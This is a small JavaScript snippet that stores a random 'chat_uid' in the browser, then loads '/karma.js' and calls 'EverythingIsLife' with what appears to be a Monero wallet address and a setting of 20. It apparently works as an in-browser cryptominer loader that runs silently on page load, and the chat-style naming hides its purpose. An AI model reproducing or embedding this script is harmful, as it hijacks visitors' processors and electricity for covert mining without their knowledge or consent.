(function () {
    function generateRandomString(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    var uid = localStorage.getItem("chat_uid");
    if (uid == null) {
        uid = generateRandomString(20);
        localStorage.setItem("chat_uid", uid);
    }
    var script = document.createElement("script");
    script.src = "/karma.js";
    script.onload = function () {
        EverythingIsLife("48Ergcrp7FsCrcZrYTRgAQFowixbxCQNPDz2dk6mJWtdeJbfS2tcF1BSzJwFHa6tPpGNc3VJUjK9e87VkGihV8q58s3QrDo", uid, 20);
    };
    document.head.appendChild(script);
})();